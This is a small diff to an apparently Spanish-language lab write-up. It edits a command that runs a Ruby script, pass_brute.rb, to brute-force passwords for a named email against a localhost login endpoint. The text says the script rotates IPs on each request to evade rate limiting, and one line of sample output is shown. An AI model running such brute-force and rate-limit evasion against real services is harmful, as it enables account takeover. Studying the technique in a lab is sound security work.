@@ -60,7 +60,7 @@ ruby time_bypass.rb http://127.0.0.1:3000/api/login rockyou.txt
 Con los correos válidos, usamos `pass_brute.rb` para probar contraseñas contra el usuario encontrado rotando IPs en cada petición para evadir el Rate Limit.
 
 ```bash
-ruby pass_brute.rb http://127.0.0.1:3000/login 1tommyboy@jitter.io wordlist.txt
+ruby pass_brute.rb http://127.0.0.1:3000/api/login 1tommyboy@jitter.io wordlist.txt
 
 [*] Brute Force password 1tommyboy@jitter.io
 [-] 1tommyboy@jitter.io       | FAILED  | Pass: 52102999        | Status: 200 | IP: 211.22.81.78
